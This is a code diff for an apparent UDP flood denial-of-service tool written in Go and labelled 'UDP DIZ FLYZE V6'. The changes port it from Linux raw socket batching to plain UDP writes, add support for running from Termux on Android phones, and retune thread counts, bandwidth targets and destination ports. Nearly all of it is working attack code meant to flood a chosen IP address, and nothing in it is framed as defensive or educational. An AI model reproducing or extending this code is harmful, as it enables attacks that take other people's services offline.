@@ -1,6 +1,3 @@
-//go:build linux
-// +build linux
-
 package main
 
 import (
@@ -11,6 +8,7 @@ import (
 	"net"
 	"net/url"
 	"os"
+	"os/exec"
 	"os/signal"
 	"runtime"
 	"strings"
@@ -18,31 +16,29 @@ import (
 	"sync/atomic"
 	"syscall"
 	"time"
-	"unsafe"
-
-	"golang.org/x/sys/unix"
 )
 
 var (
-	LINK      string
-	RATE      int32
-	duration  int
-	THREAD    int
-	SIZE      int
-	VERSI     bool
-	BANDWIT   int
-	b         bool
-	DYNAMIC   bool
+	LINK        string
+	RATE        int32
+	duration    int
+	THREAD      int
+	SIZE        int
+	VERSI       bool
+	BANDWIT     int
+	b           bool
+	DYNAMIC     bool
 	floodRunning atomic.Bool
-	KIRIM     atomic.Uint64
-	GAGAL     atomic.Uint64
-	openPorts []int
+	KIRIM       atomic.Uint64
+	GAGAL       atomic.Uint64
+	openPorts   []int
 	payloadPool *sync.Pool
 	activeThreads atomic.Int32
+	isTermux    bool
 )
 
 const (
-	version = "UDP DIZ FLYZE V5 HYPER PRO MAX"
+	version = "UDP DIZ FLYZE V6 HYPER PRO MAX"
 	ST      = 1 * time.Second
 	BC      = 2 * time.Second
 	MAX_BOOST = 3.0
@@ -58,6 +54,9 @@ func init() {
 	flag.IntVar(&BANDWIT, "maxbw", 0, "MBPS")
 	flag.BoolVar(&b, "b", true, "FAST MODE")
 	flag.BoolVar(&DYNAMIC, "dynamic", false, "DYNAMIC PAYLOAD")
+	
+	_, err := exec.LookPath("termux-setup-storage")
+	isTermux = (err == nil)
 }
 
 func main() {
@@ -82,7 +81,24 @@ func main() {
 	Config()
 	CekPort(IPT)
 	if len(openPorts) == 0 {
-		openPorts = []int{53, 80, 8080, 123, 443, 1900, 5353, 7547, 111, 137}
+		if isTermux {
+			openPorts = []int{53, 80, 8080, 443}
+		} else {
+			openPorts = []int{80, 443, 8080, 53, 111}
+		}
+	}
+
+	targets := make([]*net.UDPAddr, len(openPorts))
+	ip := net.ParseIP(IPT)
+	if ip == nil {
+		fmt.Printf("\nInvalid IP: %s\n", IPT)
+		os.Exit(1)
+	}
+	for i, port := range openPorts {
+		targets[i] = &net.UDPAddr{
+			IP:   ip,
+			Port: port,
+		}
 	}
 
 	payloadPool = &sync.Pool{
@@ -95,19 +111,23 @@ func main() {
 		},
 	}
 	
-	// Pre-warm payload pool
-	for i := 0; i < THREAD*BATCH_SIZE*2; i++ {
+	poolWarmup := THREAD * BATCH_SIZE * 2
+	if isTermux {
+		poolWarmup = THREAD * BATCH_SIZE
+	}
+	for i := 0; i < poolWarmup; i++ {
 		payloadPool.Put(payloadPool.New())
 	}
 
-	fmt.Printf("\n💉 LINK : %s\n", LINK)
-	fmt.Printf("💉 IP : %s\n", IPT)
-	fmt.Printf("💉 PORT : %v\n", openPorts)
-	fmt.Printf("💉 PAYL : %d \n", SIZE)
-	fmt.Printf("💉 THRD : %d\n", THREAD)
-	fmt.Printf("💉 RATE : %d \n", atomic.LoadInt32(&RATE))
-	fmt.Printf("💉 TIME : %d \n", duration)
-	fmt.Printf("💉 MBPS : %d \n\n", BANDWIT)
+	fmt.Printf("\n📢 LINK : %s\n", LINK)
+	fmt.Printf("🦄 IP   : %s\n", IPT)
+	fmt.Printf("🪓 PORT : %v\n", openPorts)
+	fmt.Printf("📈 PAYL : %d \n", SIZE)
+	fmt.Printf("💣 THRD : %d\n", THREAD)
+	fmt.Printf("✅ RATE : %d \n", atomic.LoadInt32(&RATE))
+	fmt.Printf("🧭 TIME : %d \n", duration)
+	fmt.Printf("🗿 MBPS : %d \n", BANDWIT)
+	fmt.Printf("♿ START: %s\n\n", envType())
 
 	sigChan := make(chan os.Signal, 1)
 	signal.Notify(sigChan, syscall.SIGINT, syscall.SIGTERM)
@@ -121,25 +141,26 @@ func main() {
 	
 	activeThreads.Store(int32(THREAD))
 	for i := 0; i < THREAD; i++ {
-		go Worker(IPT)
+		go Worker(targets)
 	}
 	
-	// Thread auto-scaling
-	go func() {
-		for floodRunning.Load() {
-			currentPPS := KIRIM.Load()
-			time.Sleep(5 * time.Second)
-			newPPS := KIRIM.Load()
-			pps := (newPPS - currentPPS) / 5
-			
-			if pps < uint64(atomic.LoadInt32(&RATE))/2 {
-				if activeThreads.Load() < int32(THREAD)*2 {
-					activeThreads.Add(1)
-					go Worker(IPT)
+	if !isTermux {
+		go func() {
+			for floodRunning.Load() {
+				currentPPS := KIRIM.Load()
+				time.Sleep(5 * time.Second)
+				newPPS := KIRIM.Load()
+				pps := (newPPS - currentPPS) / 5
+				
+				if pps < uint64(atomic.LoadInt32(&RATE))/2 {
+					if activeThreads.Load() < int32(THREAD)*2 {
+						activeThreads.Add(1)
+						go Worker(targets)
+					}
 				}
 			}
-		}
-	}()
+		}()
+	}
 
 	if duration > 0 {
 		time.AfterFunc(time.Duration(duration)*time.Second, func() {
@@ -153,34 +174,31 @@ func main() {
 	fmt.Println("\n[!] Attack stopped")
 }
 
+func envType() string {
+	if isTermux {
+		return "TERMUX"
+	}
+	return "CLOUDSHELL"
+}
+
 func Logo() string {
 	reader := bufio.NewReader(os.Stdin)
-	fmt.Print(`⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⣾⠂⣠⣶⣤⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⢀⣀⣤⠞⠽⠿⠟⠻⠿⢻⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⡤⠒⠋⠉⠁⠀⠀⠀⠀⠀⠀⠈⠙⠓⢦⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⠀⣠⠞⠁⠀⢀⣀⣀⡀⠀⠀⠀⠀⢀⣀⣀⣀⡀⠀⠙⣧⡀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⣼⠋⠀⢠⠞⠉⠀⠀⠈⠙⢦⣴⠟⠉⠀⠀⠀⠙⣧⠀⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⣠⡤⠶⢤⣼⡟⠀⢠⡟⠀⠀⠀⠀⠀⠀⠀⠉⠀⠀⢀⣀⣀⠀⢸⡆⢸⣷⣤⣴⣦⣤⣄⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⣰⡏⣰⠿⠦⣌⣻⠀⢸⡇⣾⣻⡿⣷⠀⠀⠀⠀⠀⢀⣿⣯⣽⣷⣸⡇⠀⣿⣡⠾⠛⢷⢸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⢿⡆⣿⡀⢾⡟⠁⢀⣸⣿⣷⡿⢿⣿⠀⣠⡤⠤⣄⠘⣿⣿⣹⣿⣿⣧⡀⠙⠓⣶⣤⣾⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠻⣞⢷⡾⠁⣰⠟⠉⠉⠿⣷⣿⠟⢺⣥⣤⣤⣼⡆⠙⠻⠿⠟⠀⠉⢻⡆⣤⣿⡞⣣⠟⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠈⠛⣿⡷⣇⠀⠀⠀⠀⣀⠀⠀⠀⠈⠉⠉⠀⠀⢀⣀⠀⠀⠀⠀⣸⡇⣼⡿⠿⠋⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠈⢷⡹⣄⠀⠀⠀⢻⡝⠓⠲⠤⣤⣤⠴⠚⢋⡿⠃⠀⠀⣠⡟⣰⠏⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⠀⠀⠀⠈⠳⣝⣦⣀⠀⠀⠙⢶⣞⠉⠙⠋⠉⣹⡟⠁⢀⣠⣴⣿⡞⠁⠀⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣤⣄⡀⠀
-⠀⠀⠀⠀⠀⠀⠀⠀⣠⠾⠛⠛⠻⠦⠴⣦⣌⠙⠒⠛⣋⣽⠷⠞⠋⠉⠀⠀⠹⣦⠀⠀⠀⠀⠀⠀⠀⠀⢸⠋⠀⠀⠀⠹⡆
-⠀⠀⠀⠀⠀⠀⢀⡼⠋⠀⠀⠀⠀⠀⠀⠀⠉⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠈⢷⡀⠀⠀⠀⠀⠀⠀⠘⣇⠀⠀⠀⠀⡷
-⠀⠀⠀⠀⠀⢀⣾⠁⠀⠀⠀⠀⢠⡀⣠⡶⠖⠒⠒⠒⠒⠲⠦⣀⠀⠰⣤⠀⠀⠀⠀⠀⢳⡄⠀⠀⠀⠀⠀⢠⡿⠀⠀⠀⣴⠇
-⠀⠀⠀⠀⠀⣾⠃⠀⠀⠀⠀⠀⡿⢰⠏⠀⠀⠀⠀⠀⠀⠀⠘⣧⠀⢸⣧⠀⠀⠀⠀⠀⢻⡀⠀⠀⢀⣴⠟⠁⠀⢀⣼⠋⠀
-⠀⠀⠀⠀⢰⡟⠀⠀⠀⠀⠀⢰⠇⡏⠀⠀⠀⠀⠀⠀⠀⠀⠀⢸⡀⣸⠋⣧⠀⠀⠀⠀⠸⣇⣠⡶⠋⠁⠀⠀⣠⡾⠁⠀⠀
-⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⠀⣼⡀⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠈⣷⠇⠀⣹⡄⠀⠀⠀⠀⣿⠁⠀⠀⢀⣠⠾⠋⠀⠀⠀⠀
-⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⢿⣇⠀⠀⠀⠀⠀⠀⠀⠀⢀⣼⠟⠛⠛⢯⡇⠀⠀⠀⠀⣿⣧⠤⠞⠋⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⢸⡀⠈⠛⠲⣦⡤⠤⠤⢶⣞⠋⠀⠀⠀⠀⢸⡇⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣿⡇⠀⠀⠀⠀⠀⠀⣷⣠⠴⠛⠋⠳⣦⣀⣀⣈⡿⠦⣄⣀⢀⣿⠀⠀⠀⠀⠀⢹⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠀⠀⣿⡇⠀⠀⠀⢰⡖⠒⣿⡙⢧⡀⠀⠀⠀⠈⠉⠁⢀⡴⠋⢉⣿⠿⣤⡄⠀⠀⠀⣸⡇⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀
-⠀⣠⢶⠚⣿⢷⠟⢿⡟⠾⠃⠀⠘⢷⣌⣻⡄⠀⠀⠀⠀⢠⣟⣁⣠⠞⠁⠀⢸⣧⠴⢻⣾⢿⡷⠴⢤⡄⠀⠀⠀⠀⠀⠀⠀
-⢸⣟⣭⢽⡏⠀⠀⠀⠀⠀⠀⢀⠀⠘⣿⠉⣿⠀⠀⠀⠀⣿⠋⢹⠋⢠⡄⠀⠀⠀⠀⠈⠁⢸⡿⣿⣿⠃⠀⠀⠀⠀⠀⠀⠀
-⠘⢾⡇⠸⣇⠀⢠⡄⠰⣄⠀⠘⣿⡶⡯⠴⠋⠀⠀⠀⠀⠻⢧⣬⣷⣿⠃⠀⣴⠀⠀⣦⢀⣾⠃⠈⣿⠆⠀⠀⠀⠀⠀⠀⠀
-⠀⠀⠙⠋⠉⠓⠚⠳⠶⠛⠷⠶⠛⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠀⠹⠶⠶⠿⠒⠚⠛⠉⠉⠉⠉⠁⠀⠀⠀⠀⠀⠀⠀⠀
+	fmt.Print(`
+⠀⠀⠀⠀⠀⠀⠀⠀⣀⣤⣴⣶⣾⡿⠿⠿⢿⣷⣶⣦⣤⣀⠀⠀⠀⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⣠⣴⣿⠟⠋⠉⠀⣀⣤⣤⣤⣤⣤⣀⡉⠙⠻⣿⣦⣄⠀⠀⠀⠀⠀
+⠀⠀⠀⣠⣾⡿⠋⢀⡄⠀⣰⣿⣿⣿⣿⣿⣿⣿⣿⣿⣷⣦⣀⠙⢿⣷⣄⠀⠀⠀
+⠀⠀⣴⣿⠋⢀⣴⣿⠀⢰⣿⣿⣿⡟⠛⢻⣿⣿⣿⣿⣿⣿⣿⣷⡄⠙⣿⣦⠀⠀
+⠀⣼⡿⠁⣰⣿⣿⡇⠀⢸⣿⣿⣿⣧⣀⣼⣿⣿⣿⣿⣿⣿⣿⣿⣿⣆⠈⢿⣧⠀
+⣾⣿⠃⢰⣿⣿⣿⣿⡀⠈⢿⣿⣿⣿⣿⣿⣿⠿⠟⠛⠛⠛⠛⠿⣿⣿⡄⠘⣿⡆
+⣾⡿⠀⣾⣿⣿⣿⣿⣷⣄⠀⠙⠿⣿⡿⠋⠁⢀⣤⣤⣶⣦⣤⣀⠀⠙⢷⠀⢿⣷
+⣿⡇⠀⣿⣿⣿⣿⣿⣿⣿⣷⣤⣀⡀⠀⠀⢼⣿⣿⣿⣿⣿⣿⣿⣷⣄⠈⠀⢸⣿
+⢿⣷⠀⢿⣿⣿⣿⣿⣿⠿⣿⣿⣿⣿⣷⠀⠘⣿⣿⣿⠟⠛⢿⣿⣿⣿⡀⠀⣾⡿
+⢿⣿⡄⠸⣿⣿⣿⣿⡁⠀⣸⣿⣿⣿⣿⠀⢠⣿⣿⣿⣦⣤⣾⣿⣿⣿⠃⢠⣿⠇
+⠀⢻⣷⡀⠹⣿⣿⣿⣿⣿⣿⣿⣿⣿⠃⠀⣼⣿⣿⣿⣿⣿⣿⣿⣿⠏⢀⣾⡟⠀
+⠀⠀⠻⣿⣄⠈⠛⠿⣿⣿⡿⠿⠋⠁⢀⣼⣿⣿⣿⣿⣿⣿⣿⡿⠋⣠⣿⠟⠀⠀
+⠀⠀⠀⠙⢿⣷⣄⠀⠀⢀⣀⣠⣤⣶⣿⣿⣿⣿⣿⣿⡿⠟⠉⣠⣾⡿⠋⠀⠀⠀
+⠀⠀⠀⠀⠀⠙⠻⣿⣦⣄⣈⠉⠙⠛⠛⠛⠛⠛⠉⣁⣠⣴⣿⠟⠋⠀⠀⠀⠀⠀
+⠀⠀⠀⠀⠀⠀⠀⠀⠉⠛⠻⠿⢿⣷⣶⣶⣾⡿⠿⠟⠛⠉⠀⠀⠀⠀⠀⠀⠀⠀
 ` + version + `
 ⼳ : `)
 	input, _ := reader.ReadString('\n')
@@ -228,20 +246,41 @@ func Config() {
 	runtime.ReadMemStats(memStats)
 	totalMemMB := int(memStats.Sys / (1024 * 1024))
 
-	fmt.Printf("\nCPU : %d CORES\nRAM : %d MB\n", numCPU, totalMemMB)
+	fmt.Printf("\nCPU : %d CORES\nRAM : %d GB\n", numCPU, totalMemMB)
 
-	if THREAD == 0 {
-		THREAD = numCPU * 8
-		if totalMemMB < 2048 {
+	switch {
+	case isTermux:
+		if THREAD == 0 {
 			THREAD = numCPU * 4
+			if totalMemMB < 2048 {
+				THREAD = numCPU * 2
+			}
 		}
-	}
-
-	if SIZE == 0 {
-		SIZE = 1472
-		if totalMemMB < 2048 {
+		
+		if SIZE == 0 {
 			SIZE = 1024
 		}
+		
+		if BANDWIT == 0 {
+			BANDWIT = 50
+		}
+		
+		b = false
+
+	default:
+		if THREAD == 0 {
+			THREAD = numCPU * 16
+		}
+		
+		if SIZE == 0 {
+			SIZE = 1472
+		}
+		
+		if BANDWIT == 0 {
+			BANDWIT = 2000
+		}
+		
+		b = true
 	}
 
 	baseRate := 25000
@@ -261,9 +300,7 @@ func Config() {
 
 func CekPort(IPT string) {
 	commonPorts := []int{
-		53, 67, 68, 69, 80, 8080, 123, 137, 138, 161, 
-		500, 514, 520, 1900, 4500, 5353, 11211, 7547, 
-		111, 22, 443, 8443, 1194, 5060, 33434,
+		53, 80, 443,
 	}
 	results := make(chan int, len(commonPorts))
 	timeout := time.After(2 * time.Second)
@@ -295,12 +332,7 @@ func CekPort(IPT string) {
 	}
 }
 
-func ipToBytes(ipStr string) [4]byte {
-	ip := net.ParseIP(ipStr).To4()
-	return [4]byte{ip[0], ip[1], ip[2], ip[3]}
-}
-
-func Worker(IPT string) {
+func Worker(targets []*net.UDPAddr) {
 	runtime.LockOSThread()
 	defer runtime.UnlockOSThread()
 	
@@ -310,30 +342,10 @@ func Worker(IPT string) {
 	}
 	defer conn.Close()
 	
-	rawConn, _ := conn.(*net.UDPConn).SyscallConn()
-	var rawFd int
-	rawConn.Control(func(fd uintptr) {
-		rawFd = int(fd)
-	})
-	
-	// Set socket options using unix constants
-	unix.SetsockoptInt(rawFd, unix.SOL_SOCKET, unix.SO_REUSEADDR, 1)
-	unix.SetsockoptInt(rawFd, unix.SOL_SOCKET, unix.SO_REUSEPORT, 1)
-	unix.SetsockoptInt(rawFd, unix.SOL_IP, unix.IP_MTU_DISCOVER, unix.IP_PMTUDISC_DONT)
-	unix.SetsockoptInt(rawFd, unix.SOL_SOCKET, unix.SO_SNDBUF, 1024*1024)
-
-	ipBytes := ipToBytes(IPT)
-	
-	// Pre-calculate addresses
-	addrs := make([]unix.SockaddrInet4, len(openPorts))
-	for i, port := range openPorts {
-		addrs[i] = unix.SockaddrInet4{
-			Port: port,
-			Addr: ipBytes,
-		}
+	if udpConn, ok := conn.(*net.UDPConn); ok {
+		udpConn.SetWriteBuffer(1024 * 1024)
 	}
 	
-	// Local random source
 	r := rand.New(rand.NewSource(time.Now().UnixNano()))
 	
 	for floodRunning.Load() {
@@ -347,51 +359,24 @@ func Worker(IPT string) {
 				toSend = rate - sent
 			}
 
-			// Prepare batch
-			msgs := make([]unix.Mmsghdr, toSend)
-			iovecs := make([]unix.Iovec, toSend)
-			payloads := make([][]byte, toSend)
-
 			for i := 0; i < toSend; i++ {
 				payload := payloadPool.Get().([]byte)
 				if DYNAMIC {
-					r.Read(payload)
+					rand.Read(payload)
 				}
-				payloads[i] = payload
-
-				iovecs[i] = unix.Iovec{
-					Base: &payload[0],
-					Len:  uint64(len(payload)),
+				
+				target := targets[r.Intn(len(targets))]
+				
+				_, err := conn.WriteTo(payload, target)
+				if err != nil {
+					GAGAL.Add(1)
+				} else {
+					KIRIM.Add(1)
 				}
-
-				addr := &addrs[r.Intn(len(addrs))]
-				msgs[i] = unix.Mmsghdr{
-					MsgHdr: unix.Msghdr{
-						Name:    (*byte)(unsafe.Pointer(addr)),
-						Namelen: uint32(unsafe.Sizeof(*addr)),
-						Iov:     &iovecs[i],
-						Iovlen:  1,
-					},
-				}
+				
+				payloadPool.Put(payload)
+				sent++
 			}
-
-			// Send batch using unix.Sendmmsg
-			n, err := unix.Sendmmsg(rawFd, msgs, 0)
-			if err != nil {
-				GAGAL.Add(uint64(toSend))
-			} else {
-				KIRIM.Add(uint64(n))
-				if n < toSend {
-					GAGAL.Add(uint64(toSend - n))
-				}
-			}
-
-			// Return payloads to pool
-			for _, p := range payloads {
-				payloadPool.Put(p)
-			}
-
-			sent += toSend
 			
 			if !floodRunning.Load() {
 				return
@@ -440,7 +425,6 @@ func Bndwit() {
 				newRate = int32(float64(currentRate) * boost)
 			}
 			
-			// Ensure minimum rate
 			if newRate < 1000 {
 				newRate = 1000
 			}
@@ -467,7 +451,7 @@ func Status() {
 		bytesSent := float64(current * uint64(SIZE))
 		BANDWIDTH := (bytesSent * 8 / 1000000) / TTE
 		
-		fmt.Printf("\r🚀%d 🎁%.0f 📤%.2f 🧭%.0fs Thr:%d", 
+		fmt.Printf("\r🚀%d 🎁%.0f 📤%.2f 🧭%.0fs ⚡%d", 
 			current, PPS, BANDWIDTH, TTE, activeThreads.Load())
 		
 		lastSent = current
